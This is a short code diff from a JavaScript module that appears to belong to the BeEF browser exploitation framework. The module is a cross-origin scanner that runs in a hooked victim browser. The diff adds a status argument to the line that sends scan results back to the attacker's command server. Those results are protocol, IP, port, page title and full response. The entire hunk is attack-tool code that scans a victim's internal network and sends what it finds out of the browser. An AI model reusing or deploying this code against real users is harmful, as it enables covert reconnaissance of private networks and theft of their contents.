@@ -111,7 +111,7 @@ beef.execute(function() {
        'if (response != null && response["status"] != 0) {' +
         'beef.debug("[Cross-Origin Scanner (CORS)] Received response from '+url+': " + JSON.stringify(response));' +
         'var title = response["body"].match("<title>(.*?)<\\/title>"); if (title != null) title = title[1];' +
-        'beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto='+proto+'&ip='+ips[i]+'&port='+ports[p]+'&status="+response["status"]+"&title="+title+"&response="+JSON.stringify(response));' +
+        'beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto='+proto+'&ip='+ips[i]+'&port='+ports[p]+'&status="+response["status"]+"&title="+title+"&response="+JSON.stringify(response), beef.are.status_success());' +
        '}' +
       '});'
       );
